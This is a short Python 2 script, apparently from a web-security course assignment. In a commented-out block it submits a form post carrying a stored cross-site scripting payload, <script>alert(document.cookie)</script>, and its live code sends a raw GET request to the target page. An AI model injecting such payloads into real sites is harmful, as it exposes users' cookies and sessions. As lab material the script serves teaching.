# sample exploit for sample case
# import urllib, urllib2, cookielib

# do POST to the form
# url_2 = 'http://www.wsb.com/Assignment2/case32.php'
# prepare the value of the form which includes the attack payload
# values = dict(title='here i come', content='Exploit... <script>alert(document.cookie)</script>)' )
# data = urllib.urlencode(values)
# submit the form
# req = urllib2.Request(url_2)
# rsp = urllib2.urlopen(req)
# read the return result
# content = rsp.read()
# print content

import socket


BUFFER_SIZE = 1024
host = 'www.wsb.com'
port = 80
message = 'GET /Assignment2/case32.php  HTTP1.0\r\nHost: www.wsb.com\r\n\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(message)
data = s.recv(BUFFER_SIZE)
s.close()

print "received data:", data
